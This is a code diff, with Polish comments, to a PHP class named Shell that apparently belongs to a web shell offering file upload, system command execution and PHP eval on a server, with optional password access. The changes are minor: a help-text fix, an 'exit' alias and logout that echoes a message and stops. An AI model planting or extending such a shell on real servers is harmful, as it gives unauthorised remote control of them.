@@ -37,7 +37,7 @@ class Shell
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego kataloguversion - Wyświetlanie numeru wersji shella\r\nlogout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";
+	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego katalogu\r\nversion - Wyświetlanie numeru wersji shella\r\nexit, logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -1288,15 +1288,18 @@ DATA;
 			 */
 			if( unlink( $sFilepath ) )
 			{
-				return 'Zostałeś wylogowany';
+				echo 'Zostałeś wylogowany';
+				exit ;
 			}
 			else
 			{
-				return 'Nie zostałeś wylogowany';
+				echo 'Nie zostałeś wylogowany';
+				exit ;
 			}
 		}
 
-		return 'Nie jesteś zalogowany, więc nie możesz się wylogować !!!';
+		echo 'See you (:';
+		exit ;
 	}
 
 	/**
@@ -1537,6 +1540,7 @@ DATA;
 					$sConsole = $this -> getCommandVersion();
 					break ;
 				case 'logout':
+				case 'exit':
 					$sConsole = $this -> getCommandLogout();
 					break ;
 				case 'edit':
